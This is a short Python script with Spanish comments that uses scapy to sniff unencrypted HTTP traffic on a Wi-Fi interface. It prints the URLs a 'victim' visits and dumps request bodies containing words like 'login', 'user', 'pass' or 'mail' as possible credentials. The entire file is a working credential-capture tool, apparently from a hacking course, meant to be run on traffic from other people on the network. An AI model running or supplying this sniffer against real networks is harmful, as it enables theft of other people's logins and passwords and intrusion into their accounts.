#!/usr/bin/env python3

# Importa los módulos necesarios
import scapy.all as scapy                   
from scapy.layers import http                
from termcolor import colored               
import signal                                
import sys                                   

# Función para manejar la señal SIGINT (Ctrl+C)
def def_handler(sig, frame):
    print(colored("\n[!] Saliendo...\n", 'red'))  
    sys.exit(1)                                   
# Asigna la función anterior al evento de Ctrl+C
signal.signal(signal.SIGINT, def_handler)  # Ctrl+C

# Función para procesar cada paquete capturado
def process_packet(packet):
    # Define palabras clave que indican posibles credenciales
    cred_keywords = ["login", "user", "pass", "mail"]

    # Comprueba si el paquete tiene la capa HTTPRequest (indica una solicitud HTTP)
    if packet.haslayer(http.HTTPRequest):
        # Obtiene la URL solicitada (Host y Path)
        url = "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
        print(colored(f"[+] URL visitada por la víctima: {url}", 'blue'))  # Imprime la URL en azul

        # Comprueba si el paquete tiene contenido sin procesar (Raw)
        if packet.haslayer(scapy.Raw):
            try:
                # Decodifica el contenido del paquete
                response = packet[scapy.Raw].load.decode()

                # Busca palabras clave en el contenido que podrían ser credenciales
                for keyword in cred_keywords:
                    if keyword in response:
                        # Si encuentra una palabra clave, imprime el posible dato de credenciales en verde
                        print(colored(f"\n[+] Posibles credenciales: {response}\n", 'green'))
                        break  # Detiene la búsqueda al encontrar la primera coincidencia
            except:
                pass  # Ignora cualquier error de decodificación

# Función para iniciar la captura de paquetes en una interfaz específica
def sniff(interface):
    # Captura los paquetes en la interfaz especificada y usa la función process_packet para procesarlos
    scapy.sniff(iface=interface, prn=process_packet, store=0)

def main():
    #sniff("ens33") #Cambiar la interfaz de red segun la usada! -- linux
    sniff("Wi-Fi")

if __name__ == '__main__':
    main()
